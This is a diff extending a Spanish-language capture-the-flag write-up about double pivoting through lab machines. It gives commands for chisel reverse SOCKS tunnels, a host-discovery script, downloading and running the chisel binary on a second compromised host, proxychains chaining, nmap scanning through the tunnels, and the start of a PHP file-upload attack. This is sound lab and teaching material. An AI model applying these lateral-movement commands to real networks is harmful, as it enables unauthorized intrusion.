@@ -294,7 +294,7 @@ Probamos varios comandos, pero alguos de red no funcionan:
 <img width="1415" height="534" alt="imagen" src="https://github.com/user-attachments/assets/1c32e224-eecb-464d-8348-49236ec15e63" />
 
 
-No podemos ver la nueva ianterfaz, pero viendo la ip de la máquna en /etc/hosts sabemos que puede ser 30.30.30.x. Por tanto vamos a tirar por ahí y ejecutar un script para localizar hosts en la nueva red interna y usar esta máquina y la anterior de pivote.
+No podemos ver la nueva interfaz, pero viendo la ip de la máquna en /etc/hosts sabemos que puede ser 30.30.30.x. Por tanto vamos a tirar por ahí y ejecutar un script para localizar hosts en la nueva red interna y usar esta máquina y la anterior de pivote.
 
 ```bash
 echo '#!/bin/bash
@@ -309,3 +309,96 @@ wait' > scan.sh
 # permisos y ejecución
 chmod +x scan.sh
 ./scan.sh
+```
+
+<img width="478" height="92" alt="imagen" src="https://github.com/user-attachments/assets/23b25ab2-cdf5-4f8a-93ac-cd3036be44d3" />
+
+Como vimos ya en el /etc/hosts su IP en esta nueva red es la .2, la nueva IP encontrado a la que queremos finalmente acceder es a la 30.30.30.3. De nuevo deberemos hacer pivoting pero esta vez con 2 pivotes. 
+
+Ya tenemos Chisel entre Kali y Trust. Lo que vamos a hacer ahora es crear otro túnel Chisel entre Trust e Inclusion. 
+
+| Pero hay un detalle importante: para que Inclusion pueda recibir el segundo Chisel, necesitamos que Trust pueda conectarse a Inclusion, y ya sabemos que: Trust = 20.20.20.2 e Inclusion = 20.20.20.3
+
+```bash
+## PRIMER TÚNEL
+# En Kali debe seguir funcionando su chisel
+chisel server --reverse -p 8000
+
+# Trust
+./chisel client 10.10.10.1:8000 R:socks
+```
+
+Para el segundo túnel necesitamos que Inclusion tenga el binario de Chisel. Como ya lo tenemos en /tmp de Trust podemos pasarlo a Inclusion mediante el servidor HTTP. 
+```bash
+# Trust (mario)
+cd /tmp
+ls
+python3 -m http.server 8002
+
+# Inclusion (seller-root)
+cd /tmp
+wget http://20.20.20.2:8002/chisel
+chmod+x chisel
+```
+
+```bash
+# SEGUNDO TÚNEL
+# Trust
+./chisel server --reverse -p 9000
+
+# Inclusion
+./chisel client 20.20.20.2:9000 R:20.20.20.2:1081:socks
+```
+
+Configuramos el Proxychains en Kali:
+```bash
+sudo nano /etc/proxychains4.conf
+
+# Abajo
+strict_chain
+
+[ProxyList]
+socks5 127.0.0.1 1080
+socks5 20.20.20.2 1081
+```
+
+Ya estaría la conexión. Podemos hacer ahora desde nuestro Kali un nmap a la última máquina:
+```bash
+proxychains nmap -sT -Pn -p- --open 30.30.30.3
+```
+Tras un largo escaneo (para acabar antes pero con menos puertos podemos quitar el -p-), encontramos un único servicio activo, el puerto 80 HTTP. 
+
+
+Podemos ver la web con curl. En firefox no funciona porque:
+```bash
+Firefox
+ ↓
+SOCKS 127.0.0.1:1080
+ ↓
+SOCKS 20.20.20.2:1081
+ ↓
+30.30.30.3
+```
+
+Vamos a crear un túnel accesible en Kali firefox.  En Inclusion, donde tienes Chisel conectado a Trust, puedes hacer que Trust exponga directamente el puerto 80 del objetivo. Creamos otro túnel específico:
+```bash
+# Trust
+./chisel server --reverse -p 9001
+
+# Inclusion
+./chisel client 20.20.20.2:9000 R:8080:30.30.30.3:80
+```
+Pero esto sustituiría el R:...:socks del segundo túnel, así que para tu writeup de doble pivot + navegador, te recomiendo mantener el SOCKS y crear un forwarding adicional.
+ 
+Iniciar firefox desde el user Kali.
+```bash
+proxychains firefox
+```
+Quitar el settings el proxy. 
+
+Nos encontramos la siguiente web:
+
+<img width="1588" height="415" alt="imagen" src="https://github.com/user-attachments/assets/e0ffd60a-4f66-4081-b2d6-4c90793cd877" />
+
+Todo apunta a que la vulnerabilidad de la web es un File Upload. Vemos que la web es php, por lo que intentaremos subir un archivo de este tipo que se pueda ejecutar en el servidor. 
+
